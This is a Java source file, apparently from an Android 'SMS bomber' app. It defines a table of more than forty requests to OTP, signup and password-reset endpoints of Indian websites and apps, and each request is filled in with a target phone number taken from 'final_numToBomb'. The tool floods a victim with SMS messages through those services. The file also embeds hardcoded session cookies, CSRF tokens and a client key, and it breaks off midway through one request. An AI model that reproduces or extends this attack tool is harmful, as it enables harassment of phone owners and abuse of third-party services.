package com.sktechhub.android.sktechbomber;

import android.util.Log;

import okhttp3.Headers;
import okhttp3.Request.Builder;
import okhttp3.RequestBody;
import com.google.gson.JsonObject;
import com.unity3d.services.core.request.WebRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

public class smsApi {


    public static String random(int length, int key)    //key 0->combined ,1 ->alphabets ,2->numbers
    {
        String characters = "";
        if (key == 0)
            characters = "abcdefghijklmnopqrstuvwxyz1234567890";
        else if (key == 1)
            characters = "abcdefghijklmnopqrstuvwxyz";
        else if (key == 2)
            characters = "1234567890";
        int charactersLength = characters.length();
        String randomString = "";
        for (int i = 0; i < length; i++) {

            randomString += characters.charAt((int) (Math.random() * charactersLength));
        }
        return randomString;
    }

    public String decode(String url)
    {
        String decoded="";
        return decoded;
    }



    public static JSONObject json_fields(String name) {
        JSONObject json2 = new JSONObject();
        try {

             if (name.equalsIgnoreCase("wynk"))
                json2.put("msisdn", MainActivity.final_numToBomb);
            else if (name.equalsIgnoreCase("medlife"))
                json2.put("mobileNumber", MainActivity.final_numToBomb);
            else if (name.equalsIgnoreCase("paisabazaar"))
            {
                json2.put("mobileNumber ",  MainActivity.final_numToBomb);
                json2.put("productId", "19");
                json2.put("visitId", "82769d0a-7343-48bd-b3cd-250831be8da1");
            }
            else if (name.equalsIgnoreCase("treebo"))
            {
                json2.put("phone_number ",  MainActivity.final_numToBomb);
            }
            else if (name.equalsIgnoreCase("hike"))
            {
                json2.put("MSISDN ", "+91"+MainActivity.final_numToBomb);
                json2.put("method", "pin");

            }

        }

        catch (JSONException e) {
            e.printStackTrace();
        }
        return json2;

    }



    public static ApiClassStructure apis(String name,  String server) {

        final String JsonTSr="application/json; charset=utf-8";
        final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        final String urlencStr="application/x-www-form-urlencoded";
        final MediaType URLEnc = MediaType.parse("application/x-www-form-urlencoded");
        Map<String, String> header = new HashMap<>();

        ApiClassStructure apis = null;


        if(server.length()<2 || !server.startsWith("http"))
                server="server_link_here";



//---------------------------------------------------------------------------------------------------------------------------------


        else if (name.equalsIgnoreCase("1")) {
            header.clear();
            header.put("Content-Type", "application/json");
            header.put("cookie","_ga=GA1.2.1664448755.1584883607; _gcl_au=1.1.1482610236.1584883618; _fbp=fb.1.1584883619223.2019010020; _gid=GA1.2.1516586479.1585046173; mp_7365746e85e51e1f469b125396a47c27_mixpanel=%7B%22distinct_id%22%3A%20%221710c1d374b8d-043fb9937cdec8-f313f6d-144000-1710c1d374c462%22%2C%22%24device_id%22%3A%20%221710c1d374b8d-043fb9937cdec8-f313f6d-144000-1710c1d374c462%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; JSESSIONID=304C713418925F38EDB598D9B53AA91F; AWSALB=wc4HlMzC6xpHdo/mlg9DLLV7eESrtuu9mebD27ctrVksGHwnN+s8Mzc51tJic381SJHVdK/ByIz0d22o0rZ6dmSOv+DB8wTAErRDHpG6sJxRBPMR1C3ZgW17eXlF; AWSALBCORS=wc4HlMzC6xpHdo/mlg9DLLV7eESrtuu9mebD27ctrVksGHwnN+s8Mzc51tJic381SJHVdK/ByIz0d22o0rZ6dmSOv+DB8wTAErRDHpG6sJxRBPMR1C3ZgW17eXlF");
            //String jsonString15 = json2.toString();
            RequestBody body15 = RequestBody.create(JSON, "{\"mobile\":\""+MainActivity.final_numToBomb+"\"}");
            apis = new ApiClassStructure("1delhivery",
                    "https://direct.delhivery.com/order/generate-otp",
                    0, 0,
                    "{\"status\":\"success\",\"message\":\"OTP sent successfully.\",\"info\":\"OTP sent.\",\"success\":true}",
                    Headers.of(header),
                    body15);
        }


        else if(name.equalsIgnoreCase("2")) {
            header.clear();
            apis = new ApiClassStructure("2confirmtkt",
                    "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+MainActivity.final_numToBomb,
                    1, 0,
                    "false",
                    null,
                    new FormBody.Builder().build());
        }

        else if (name.equalsIgnoreCase("3")) {
            header.clear();
            header.put("content-type","application/x-www-form-urlencoded");

            apis = new ApiClassStructure("3hexi",
                    "https://apiv1.hexibike.com/api/getNewUserHexiOTP",
                    0, 0,
                    "{\"status\":200,\"success\":1,\"msg\":\"Otp Sent To Mobile Successfully\"",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("country_code", "91")
                            .add("mobile_no", MainActivity.final_numToBomb).build());
        }
        else if (name.equalsIgnoreCase("4")) {
            header.clear();
            header.put("content-type","application/x-www-form-urlencoded");

            apis = new ApiClassStructure("4hexi1",
                    "https://apiv1.hexibike.com/api/getNewHexiForgetOTP",
                    0, 0,
                    "{\"status\":200,\"success\":1,\"msg\":\"Otp Sent To Mobile Successfully\"",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("country_code", "91")
                            .add("mobile_no", MainActivity.final_numToBomb).build());
        }

        else if (name.equalsIgnoreCase("5")) {
            header.clear();
            header.put("host","www.goibibo.com");
            header.put("user-agent","Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0");
            header.put("accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            header.put("accept-language","en-US,en;q=0.5");
            header.put("accept-encoding","gzip, deflate, br");
            header.put("referer","https://www.goibibo.com/mobile/?sms=success");
            header.put("content-type","application/x-www-form-urlencoded");
            header.put("content-length","14");header.put("connection","keep-alive");

            apis = new ApiClassStructure("5goibibo",
                    "https://www.goibibo.com/common/downloadsms/",
                    0, 0,
                    "low_chance",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("mbl", MainActivity.final_numToBomb).build());
        }

        else if (name.equalsIgnoreCase("6")) {
            apis = new ApiClassStructure("6magicbricks",
                    "https://www.magicbricks.com/bricks/processValidMobile.html",
                    0, 0,
                    "\"otpSent\":true",
                    null,
                    new FormBody.Builder()
                            .add("ubimobile", MainActivity.final_numToBomb)
                            .add("from", "login")
                            .build());
        }
        else if (name.equalsIgnoreCase("7")) {
            apis = new ApiClassStructure("7magicbricks2",
                    "https://accounts.magicbricks.com/userauth/api/validate-mobile",
                    0, 0,
                    "{\"maskedMobile\":",
                    null,
                    new FormBody.Builder()
                            .add("ubimobile", MainActivity.final_numToBomb)
                            .build());
        }
        else if (name.equalsIgnoreCase("8")) {
                    apis = new ApiClassStructure("8magicbricks1",
                            "https://www.magicbricks.com/bricks/resendVerifictionCode.html?from=register&mobile="+MainActivity.final_numToBomb,
                            1, 0,
                            "success",
                            null,
                            new FormBody.Builder().build());
            }

        else if (name.equalsIgnoreCase("9")) {
            header.clear();
            header.put("Content-Type", "application/json");
            String jsonString9 = "{\"msisdn\": \""+MainActivity.final_numToBomb+"\"}";
            RequestBody body9 = RequestBody.create(JSON, jsonString9);
            apis = new ApiClassStructure("9wynk",
                    "https://sapi.wynk.in/music/v2/account/otp",
                    0, 0,
                    "{\"msisdn\":\"",
                    Headers.of(header),
                    body9);
        }

        else if (name.equalsIgnoreCase("10")) {

            header.clear();
            header.put("cookie", " _csrf=HnJqahIcYTylcN6TEXCHFfKO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DWB%2Ccity%3DKOLKATA%2Clat%3D22.57%2Clong%3D88.37%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dvhigh%2Cbw%3D5000%2Casnum%3D135214%2Clocation_id%3D0; mab=2d506c845bd25f9c401f1fe813683266; expd=sold%3A1%7Cmww2%3A1%7Chbad%3A0%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cmwsl%3A0%7Cwfpm%3A0%7Chsdm%3A1%7Clpex%3A0%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=s3IzSGzJ-lr1oXtifJEVlze0XKanizDtQIcU; fingerprint2=9cc592eba180b80a4d7db9f669802722; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.1136135421.1584983690; _gid=GA1.2.1358987927.1584983690; _gat=1; _gcl_au=1.1.2004615561.1584983693; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); _fbp=fb.1.1584983694450.1134248735");
            header.put("referer", " https://www.oyorooms.com/login?country=&retUrl=/");
            header.put("sec-fetch-dest", " empty");
            header.put("sec-fetch-mode", " cors");
            header.put("sec-fetch-site", " same-origin");
            header.put("user-agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
            header.put("xsrf-token", " s3IzSGzJ-lr1oXtifJEVlze0XKanizDtQIcU");

            apis = new ApiClassStructure("10oyo",
                    "https://www.oyorooms.com/api/pwa/generateotp?phone="+MainActivity.final_numToBomb+"&country_code=%2B91&nod=4&locale=en",
                    1, 0,
                    "{\"status\":\"correct\"",
                    Headers.of(header),
                    new FormBody.Builder().build());
        }

        else if (name.equalsIgnoreCase("11")) {
            header.clear();
            header.put("host", "www.snapdeal.com");
            header.put("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0");
            header.put("accept", "*/*");
            header.put("accept-language", "en-US,en;q=0.5");
            header.put("accept-encoding", "gzip, deflate, br");
            header.put("referer", "https://www.snapdeal.com/iframeLogin");
            header.put("x-requested-with", "XMLHttpRequest");
            header.put("content-length", "62");
            header.put("connection", "keep-alive");

            apis = new ApiClassStructure("11snapdeal",
                    "https://www.snapdeal.com/sendOTP",
                    0, 0,
                    "{\"status\":\"success\",",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("mobileNumber", MainActivity.final_numToBomb)
                            .add("purpose", "LOGIN_WITH_MOBILE_OTP")
                            .build());
        }
        else if (name.equalsIgnoreCase("12")) {
            apis = new ApiClassStructure("12snapdeal1",
                    "https://www.snapdeal.com/sendOTP",
                    0, 0,
                    "{\"status\":\"success\",\"ite",
                    null,
                    new FormBody.Builder()
                            .add("mobileNumber", MainActivity.final_numToBomb)
                            .add("emailId", "")
                            .add("purpose", "LOGIN_WITH_MOBILE_OTP")
                            .build());
        }

        else if (name.equalsIgnoreCase("13")) {
            header.clear();
            header.put("content-type","application/x-www-form-urlencoded");
            header.put("cookie","JSESSIONID=2CDD9EE7399D7897FDD8A007ADE27C95;");
            apis = new ApiClassStructure("13lybrate",
                    "https://www.lybrate.com/reset/password/request",
                    0, 0,
                    "{\"status\":\"success\"",
                    null,
                    new FormBody.Builder()
                            .add("countryCode","IN")
                            .add("newPass", random(8,0))
                            .add("mobile", MainActivity.final_numToBomb)
                            .build());
        }
        else if (name.equalsIgnoreCase("14")) {
            header.clear();
            header.put("Content-Type", "application/json");
            header.put("cookie","JSESSIONID=2CDD9EE7399D7897FDD8A007ADE27C95;");
            String abc="{\"countryCode\":\"IN\",\"firstName\":\"SkTechOne\",\"mobile\":\""+MainActivity.final_numToBomb+"\",\"password\":\"dsfdsfk@kdvdm\",\"email\":\""+random(6,0)+"@gmail.com\"}";
            RequestBody body24 = RequestBody.create(JSON, abc);
            apis = new ApiClassStructure("14lybrate1",
                "https://www.lybrate.com/p/login-signup",
                0, 0,
                "{\"successful\":true",
                Headers.of(header),
                body24);
        }

        else if (name.equalsIgnoreCase("15")) {

            header.clear();
            header.put("Content-Type", "application/json");
            header.put("x-client-key","f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6");
            header.put("x-device-id","ucu3bf80-8b9d767870-9eac-89a1-a8e1-c985381abd-1584888830877");
            header.put("x-device-os","desktop_web");

            String abc="{\"country_id\":\"IND\",\"phone\":{\"isd_code\":\"+91\",\"phone_wo_isd\":\""+MainActivity.final_numToBomb+"\"},\"device_type\":\"customer\"}";
            RequestBody body15 = RequestBody.create(JSON, abc);

            apis = new ApiClassStructure("15urbanclap",
                    "https://www.urbanclap.com/api/v3/customers/simplegenerateotp",
                    0, 0,
                    "{\"isError\":false,\"success\"",
                    Headers.of(header),
                    body15);
        }

        else if (name.equalsIgnoreCase("16")) {
            header.clear();

            apis = new ApiClassStructure("16sulekha",
                    "https://myaccount.sulekha.com/network/userauthsulv2.aspx?" ,
                    0, 0,
                    "{status: 'success'}",
                    null,
                    new FormBody.Builder()
                            .add("mode", "sendvcode")
                            .add("mobilenumber", MainActivity.final_numToBomb)
                            .add("rnd", "0.7730936251685485")
                            .add("callback", "jQuery1102019922898790479215_"+System.currentTimeMillis())
                            .build());
        }
        else if (name.equalsIgnoreCase("17")) {
            header.clear();

            apis = new ApiClassStructure("17sulekha1",
                    "https://myaccount.sulekha.com/network/userauthsulv2.aspx?" ,
                    0, 0,
                    "{status: 'success'}",
                    null,
                    new FormBody.Builder()
                            .add("mode", "chkmobileno")
                            .add("mobilenumber", MainActivity.final_numToBomb)
                            .add("rnd", "0.7730936251685485")
                            .add("callback", "jQuery1102019922898790479215_"+System.currentTimeMillis())
                            .build());
        }

        else if (name.equalsIgnoreCase("18")) {
            header.clear();
            header.put("Content-Type", "application/json");

            String jsonString17 = "{\"mobileNumber\":\""+MainActivity.final_numToBomb+"\"}";
            RequestBody body17 = RequestBody.create(JSON, jsonString17);
            apis = new ApiClassStructure("18medlife",
                    "https://svc.medlife.com/ml-rest-services/v1/medlife/OTP",
                    2, 0,
                    "{\"status\":true,\"message\":\"Success\"}",
                    Headers.of(header),
                    body17);
        }
        else if (name.equalsIgnoreCase("19")) {
            header.clear();
            header.put("Content-Type", "application/json");


            String jsonString17 = "{\"mobileNumber\":\""+MainActivity.final_numToBomb+"\"}";
            RequestBody body17 = RequestBody.create(JSON, jsonString17);
            apis = new ApiClassStructure("19medlife1",
                    "https://svc.medlife.com/ml-rest-services/v1/medlife/customer/isRegistered",
                    0, 0,
                    "{\"status\":true,\"message\":\"Success\"}",
                    Headers.of(header),
                    body17);
        }

        else if (name.equalsIgnoreCase("20")) {
            apis = new ApiClassStructure("20paisabazaar",
                    "https://api2.paisabazaar.com/BSP/api/v1/visitor",
                    0, 0,
                    "\"status\":true,\"statusCode\":\"0\",\"statusMessage\":\"Success\",\"response\"",
                   null,
                    new FormBody.Builder()
                    .add("mobileNo",MainActivity.final_numToBomb)
                    .add("visitId","82769d0a-7343-48bd-b3cd-250831be8da1")
                    .add("productId","19")
                    .build());
        }


        else if (name.equalsIgnoreCase("21")) {
            apis = new ApiClassStructure("21lenskart",
                    "https://www.ref-r.com/clients/lenskart/smsApi",
                    0, 0,
                    "{\"result\":\"Message Accepted for Request ID",
                    null,
                    new FormBody.Builder()
                            .add("mobile", MainActivity.final_numToBomb)
                            .add("submit", "1")
                            .add("undefined", "")
                            .build());
        }
        else if (name.equalsIgnoreCase("22")) {

            header.clear();
            header.put("x-session-token","62dd4d88-36b5-48e9-a63a-64510a8502ed");
            header.put("x-api-client", "desktop");
            String lensapi="{\"telephone\":\""+MainActivity.final_numToBomb+"\"}";
            RequestBody body18 = RequestBody.create(JSON, lensapi);
            apis = new ApiClassStructure("22lenskart1",
                    "https://api.lenskart.com/v2/customers/sendOtp",
                    0, 0,
                    "traceId",
                    Headers.of(header),
                    body18);
        }

        else if (name.equalsIgnoreCase("23")) {
            header.clear();
            header.put("Content-Type", "application/json");
            header.put("Accept-Encoding","gzip, deflate, br");
            header.put("Accept-Language"," en-US,en;q=0.9");
            header.put("Authorization"," Bearer null");
            header.put("Connection","keep-alive");
            header.put("Content-Length","29");
            header.put("Host","www.treebo.com");
            header.put("Origin","https://www.treebo.com");
            header.put("Cookie","token=\"\"; user_id=82135c68-a73b-4003-9b32-a5312ff931e3");
            header.put("Referer","https://www.treebo.com/login/");
            header.put("Sec-Fetch-Dest","empty");
            header.put("Sec-Fetch-Mode"," cors");
            header.put("Sec-Fetch-Site"," same-origin");
            header.put("User-Agent"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");



            RequestBody body24 = RequestBody.create(JSON, "{\"phone_number\":\""+MainActivity.final_numToBomb+"\"}");

            apis = new ApiClassStructure("23treebo",
                    "https://www.treebo.com/api/v2/auth/login/otp/",
                    0, 0,
                    "status\":200,",
                    Headers.of(header),
                    body24);
        }

        else if (name.equalsIgnoreCase("24")) {
            header.clear();
            header.put("Content-Type", "application/json");

            RequestBody body24 = RequestBody.create(JSON, "{\"contactNumber\":\""+MainActivity.final_numToBomb+"\"}");
            apis = new ApiClassStructure("24pharma",
                    "https://pharmeasy.in/api/auth/requestOTP",
                    0, 0,
                    "{\"resendSmsCounter\":",
                    Headers.of(header),
                    body24);
        }

        else if (name.equalsIgnoreCase("25")) {
            header.clear();
            header.put("Content-Type", "application/json");
            String jsonString23 = "{\"msisdn\":\"+91"+MainActivity.final_numToBomb+"\",\"method\":\"pin\"}";
            RequestBody body23 = RequestBody.create(JSON,jsonString23);

            apis = new ApiClassStructure("25hike",
                    "https://api.im.hike.in/v3/account/validate?digits=4",
                    0, 0,
                    "{\"msisdn\": \"",
                    Headers.of(header),
                    body23);
        }

        else if (name.equalsIgnoreCase("26")) {

            header.clear();
            header.put("Content-Type", "application/json");

            String jsonString24 = "{\"phone\":\""+MainActivity.final_numToBomb+"\",\"country_code\":\"IN\",\"otp_type\":1,\"email\":\"\",\"send_otp\":true,\"is_un_teach_user\":false}";
            RequestBody body24 = RequestBody.create(JSON, jsonString24);
            apis = new ApiClassStructure("26unacademy",
                    "https://unacademy.com/api/v3/user/user_check/",
                    0, 0,
                    "{\"message\":\"OTP has been sent to your phone number\"",
                    Headers.of(header),
                    body24);
        }

        else if(name.equalsIgnoreCase("27")){
            header.clear();
            header.put("Host", "www.thyrocare.com");
            header.put("Content-Type","application/json");

            String jsonString24 = "{\"strType\":\"Generate_OTP\",\"strmobile\":\""+MainActivity.final_numToBomb+"\",\"strstatus\":\"\"}";
            RequestBody body24 = RequestBody.create(JSON, jsonString24);

            apis = new ApiClassStructure("27thyrocare",
                        "https://www.thyrocare.com/Login.aspx/Generate_OTP",
                        0, 0,
                        "success",
                        Headers.of(header),
                        body24);
        }

        else if(name.equalsIgnoreCase("28")){
            header.clear();

            header.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");


            apis = new ApiClassStructure("28yatra",
                        "https://secure.yatra.com/social/common/yatra/sendMobileOTP",
                        0, 0,
                        "{\"interactionId\":\"",
                        Headers.of(header),
                            new FormBody.Builder()
                                    .add("isdCode","91")
                                    .add("mobileNumber",MainActivity.final_numToBomb)
                                    .build());
        }

        else if(name.equalsIgnoreCase("29")){
            String csrf="d7363fa4c020153c6ca972be9cef8ad9debdccaf08bde29e6dac30e2ecb41258c8b981e6b4d0a41536423270f389f76990f929c5f70042cc1b9dc8e6e1a0293f";
            header.clear();
            header.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            header.put("cookie","csrfToken="+csrf);


            apis = new ApiClassStructure("29easypolicy",
                    "https://www.easypolicy.com/users/send-otp-account-section",
                    0, 0,
                    "success",
                    Headers.of(header),
                    new FormBody.Builder()
                    .add("mobile",MainActivity.final_numToBomb)
                    .add("_csrfToken",csrf)
                    .build());
        }
        else if(name.equalsIgnoreCase("30")){
            String csrf="d7363fa4c020153c6ca972be9cef8ad9debdccaf08bde29e6dac30e2ecb41258c8b981e6b4d0a41536423270f389f76990f929c5f70042cc1b9dc8e6e1a0293f";
            header.clear();
            header.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            header.put("cookie","csrfToken="+csrf);


            apis = new ApiClassStructure("30easypolicy1",
                    "https://www.easypolicy.com/users/resend-otp-account-section",
                    0, 0,
                    "success",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("mobile",MainActivity.final_numToBomb)
                            .add("_csrfToken",csrf)
                            .build());
        }

        else if(name.equalsIgnoreCase("31")){
            apis = new ApiClassStructure("31netmeds",
                    "https://www.netmeds.com/mst/rest/v1/id/details/"+MainActivity.final_numToBomb,
                    1, 0,
                    "\"result\":{\"otp_details\":",
                    null,
                    new FormBody.Builder().build());
        }
        else if(name.equalsIgnoreCase("32")){
            apis = new ApiClassStructure("32netmeds1",
                    "https://www.netmeds.com/cms/mobisms/submit",
                    0, 0,
                    "success",
                    null,
                    new FormBody.Builder()
                            .add("MessageID","netmeds163")
                            .add("phoneNumber",MainActivity.final_numToBomb)
                            .add("attributes[[orderID]]","")
                            .build());
        }

        else if(name.equalsIgnoreCase("33")){
            header.clear();
            String str = "application/x-www-form-urlencoded";
            header.put("Host", "www.amazon.in");
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
            header.put("Content-Type", str);header.put("X-Requested-With", "XMLHttpRequest");header.put("Content-Length", "53");
            header.put("Connection", "keep-alive");
            RequestBody body24 = RequestBody.create(URLEnc, "recipient="+MainActivity.final_numToBomb+"&client=kcp&communicationType=sms");
            apis = new ApiClassStructure("33kindle",
                    "https://www.amazon.in/kindle-dbs/ajax/SendSMSorEmail?ref=kcpapp_snt",
                    0, 0,
                    "{\"status\":\"1\"}",
                    Headers.of(header),
                    body24);
        }

        else if(name.equalsIgnoreCase("34")){
            header.clear();
            header.put("Content-Type", "application/json");
            header.put("Cookie","ASP.NET_SessionId=y2rbdwtqrs2zpbgfot5tibeo");
            String id=""+(307509+Integer.parseInt(random(2,2)));
            RequestBody body24 = RequestBody.create(JSON, "{\"TrialId\":\""+id+"\",\"DestinationMobileNo\":\""+MainActivity.final_numToBomb+"\",\"IsResent\":false,\"IsChild\":\"0\"}");
            apis = new ApiClassStructure("34bausch",
                    "https://www.bauschandlomb.in/freetrial/ActivationServices/SendSMS",
                    0, 0,
                    "1",
                    Headers.of(header),
                    body24);
        }

        else if(name.equalsIgnoreCase("35")){
            header.clear();
            header.put("Content-Type", "application/json");
            RequestBody body24 = RequestBody.create(JSON, "{\"mobile\":\""+MainActivity.final_numToBomb+"\"}");
            apis = new ApiClassStructure("35frapp",
                    "https://vortex.frapp.in/mobileotp/createOtp2",
                    0, 0,
                    "\"id\":",
                    Headers.of(header),
                    body24);
        }

        //===============================================================================

        //===============================================================================

        //===============================================================================


        else if(name.equalsIgnoreCase("36")){
            header.clear();
             header.put("host", "www.flipkart.com");
            header.put("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0");
            header.put("accept", "*/*");
            header.put("accept-language", "en-US,en;q=0.5");
            header.put("accept-encoding", "gzip, deflate, br");
            header.put("referer", "https://www.flipkart.com/");
            header.put("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop");
            header.put("origin", "https://www.flipkart.com");
            header.put("connection", "keep-alive");
            header.put("Content-Type", "application/json; charset=utf-8");
            header.put("Content-Length", "53");

            String jsonString24 = "{\"loginId\":[\"+91"+MainActivity.final_numToBomb+"\"],\"supportAllStates\":true}";
            RequestBody body24 = RequestBody.create(JSON, jsonString24);
            apis = new ApiClassStructure("36flipkart",
                    "https://www.flipkart.com/api/6/user/signup/status",
                    0, 0,
                    "  \"STATUS_CODE\": 200",
                    Headers.of(header),
                    body24);
        }
        else if(name.equalsIgnoreCase("37")){
            header.clear();
            header.put("Host", "www.flipkart.com");
            header.put("Connection", "keep-alive");
            header.put("Content-Length", "60");
            header.put("X-user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop");
            header.put("Origin", "https://www.flipkart.com");
            header.put("Save-Data", "on");
            header.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36");
            header.put("Content-Type", "application/x-www-form-urlencoded");
            header.put("Accept", "*/*");
            header.put("Referer", "https://www.flipkart.com/");
            header.put("Accept-Encoding", "gzip, deflate, br");
            header.put("Accept-Language", "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6");
            header.put("Cookie", "T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D");

            apis = new ApiClassStructure("37flipkart1",
                    "https://www.flipkart.com/api/5/user/otp/generate",
                    0, 0,
                    "  \"STATUS_CODE\": 200",
                    Headers.of(header),
                    new FormBody.Builder()
                            .add("loginId","+91"+MainActivity.final_numToBomb)
                            .add("state","VERIFIED")
                            .add("churnEmailRequest","false").build());
        }

        else if(name.equalsIgnoreCase("38")){
            header.clear();
            header.put("Content-Type", "application/json");
            RequestBody body24 = RequestBody.create(JSON, "{\"phone\":\"+91"+MainActivity.final_numToBomb+"\"}");
            apis = new ApiClassStructure("38pizzahut",
                    "https://api.pizzahut.io/v1/otp/generate",
                    0, 0,
                    "token",
                    Headers.of(header),
                    body24);
        }

        else if(name.equalsIgnoreCase("39")){
            header.clear();
            header.put("Content-Type", "application/json");
            header.put("origin", "https://pizzaonline.dominos.co.in");
            header.put("referer", "https://pizzaonline.dominos.co.in/menu");
            String bod="{\"lastName\":\"\",\"mobile\":\""+MainActivity.final_numToBomb+"\",\"firstName\":\"\"}";
            RequestBody body24 = RequestBody.create(JSON, bod);
            apis = new ApiClassStructure("39dominos",
                    "https://api.dominos.co.in/loginhandler/forgotpassword",
                    0, 0,
                    "status",
                    Headers.of(header),
                    body24);
        }

        else if(name.equalsIgnoreCase("40")){
            header.clear();

            header.put("Host", "www.apollopharmacy.in");
            header.put("content-length", "17");
            header.put("accept", "*/*");
            header.put("origin", "https://www.apollopharmacy.in");
            header.put("x-requested-with", "XMLHttpRequest");

            header.put("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
            header.put("referer", "https://www.apollopharmacy.in/sociallogin/mobile/login/");

            header.put("cookie", "__cfduid=d64c65a2edad54086382759cdf599de901558686615");

            apis = new ApiClassStructure("40appollo",
                    "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
                    0, 0,
                    "sent",
                    Headers.of(header),
                    new FormBody.Builder()
                        .add("mobile",MainActivity.final_numToBomb)
                        .build());
        }

        else if(name.equalsIgnoreCase("41")){
            header.clear();

            header.put("Accept", "application/json");
            header.put("Origin", "https://www.ajio.com");
            header.put("content-type", "application/json");
            header.put("Cookie", "_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c");

